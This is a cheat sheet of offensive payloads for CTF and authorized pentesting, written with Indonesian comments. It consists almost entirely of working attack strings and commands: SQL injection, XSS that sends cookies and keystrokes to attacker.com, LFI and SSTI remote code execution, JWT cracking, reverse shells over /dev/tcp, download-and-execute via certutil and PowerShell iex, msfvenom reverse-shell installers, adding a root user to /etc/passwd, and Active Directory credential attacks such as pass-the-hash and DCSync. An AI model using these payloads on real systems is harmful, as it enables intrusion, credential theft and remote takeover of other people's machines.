# Payloads Reference — CTF & Authorized Pentest

> ⚠️ Gunakan HANYA pada sistem yang Anda miliki atau yang telah memberikan izin eksplisit.

## Web Payloads

### SQL Injection

```sql
-- Authentication bypass
' OR '1'='1' --
' OR 1=1 --
admin'--
' OR 'x'='x

-- UNION-based (cari jumlah kolom dulu)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--

-- Error-based (MySQL)
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

-- Blind boolean-based
' AND 1=1--   (true)
' AND 1=2--   (false)
' AND SUBSTRING(username,1,1)='a'--

-- Time-based blind
' AND SLEEP(5)--                              # MySQL
' AND 1=1; WAITFOR DELAY '0:0:5'--           # MSSQL
' AND 1=1; SELECT pg_sleep(5)--              # PostgreSQL
```

### XSS Payloads

```javascript
// Basic
<script>alert(1)</script>
<script>alert(document.domain)</script>

// Bypass quotes
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

// Bypass script filter
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>

// Bypass html encoding
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

// Cookie exfil
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>

// Keylogger (XSS)
<script>document.onkeypress=function(e){fetch('http://attacker.com/key?k='+e.key)}</script>
```

### LFI Payloads

```
# Basic traversal
../../../../etc/passwd
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd   # double encoding

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input (dengan POST body berisi PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id

# File targets yang menarik (Linux)
/etc/passwd
/etc/shadow        (butuh root)
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log    # untuk log poisoning
/var/log/auth.log
~/.ssh/id_rsa
/home/user/.bash_history
```

### SSTI (Server-Side Template Injection)

```
# Test characters
{{7*7}}         → 49  (Jinja2/Twig)
${7*7}          → 49  (FreeMarker/Velocity)
<%= 7*7 %>      → 49  (ERB/Ruby)
#{7*7}          → 49  (Ruby/Smarty)
*{7*7}          → 49  (Thymeleaf)

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### JWT Attacks

```bash
# Decode JWT (tanpa verifikasi)
echo "eyJhbGci..." | base64 -d

# None algorithm attack
# Ubah alg ke "none", hapus signature

# Brute force secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# Tools
jwt_tool -t http://target/api -rc "Authorization: Bearer [JWT]" -M at
```

---

## Encoding / Decoding Cheatsheet

```
URL encode        : %20 (space), %3C (<), %3E (>), %22 ("), %27 (')
Double URL encode : %2520 (%), %253C (<)
HTML entities     : &lt; (<), &gt; (>), &amp; (&), &#x27; (')
Base64            : echo -n "string" | base64
Base64 decode     : echo "c3RyaW5n" | base64 -d
Hex               : echo -n "string" | xxd
Unicode           : \u003c (<), \u003e (>)
```

---

## Linux Post-Exploitation Snippets

```bash
# Cek SUID — cari yang bisa diexploit via GTFOBins
find / -perm -4000 2>/dev/null | xargs ls -la

# Sudo -l exploitation examples
# sudo vim → :!/bin/bash
# sudo less /etc/passwd → !sh
# sudo find / -exec /bin/bash \;
# sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
# sudo awk 'BEGIN {system("/bin/bash")}'
# sudo perl -e 'exec "/bin/bash";'

# Writable /etc/passwd → tambah user baru
echo 'newuser:$(openssl passwd -1 password123):0:0:root:/root:/bin/bash' >> /etc/passwd
su newuser

# Cron job exploitation
# Jika script di cron writable oleh kita:
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> /path/to/cron/script.sh

# PATH hijacking
# Cek apakah ada relatif command di SUID binary
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -p' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
```

---

## Windows Post-Exploitation Snippets

```powershell
# Cek user & privilege
whoami /all
net user
net localgroup administrators

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -enc [base64_encoded_command]

# Download file
certutil -urlcache -split -f http://attacker/file.exe C:\Temp\file.exe
iex (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
curl http://attacker/file -o C:\Temp\file.exe

# AlwaysInstallElevated exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# Token impersonation (SeImpersonatePrivilege)
# → JuicyPotato / PrintSpoofer / RoguePotato
.\PrintSpoofer.exe -i -c cmd
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe"
```

---

## Active Directory Attacks

```bash
# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -no-pass

# BloodHound collection
SharpHound.exe --CollectionMethod All
bloodhound-python -u user -p pass -d domain.local -dc DC_IP -c All

# Pass-the-Hash
crackmapexec smb target -u admin -H [NTLM_hash]
psexec.py -hashes :NTLM_hash domain/admin@target

# DCSync (jika punya replication rights)
secretsdump.py domain/admin:pass@DC_IP
```

---

## Crypto CTF Cheatsheet

```python
# Caesar cipher brute force
for shift in range(26):
    print(shift, ''.join(chr((ord(c)-65-shift)%26+65) if c.isupper() else c for c in ciphertext))

# RSA — cek dengan rsactftool
rsactftool.py --publickey public.pem --attack all

# XOR decode
from pwn import xor
xor(b'ciphertext', b'key')

# Frequency analysis
from collections import Counter
Counter(ciphertext).most_common(5)

# Base encodings
import base64
base64.b64decode(text)
base64.b32decode(text)
base64.b16decode(text)

# CyberChef operations yang sering berguna:
# From Base64, From Hex, ROT13, XOR, Magic (auto-detect)
```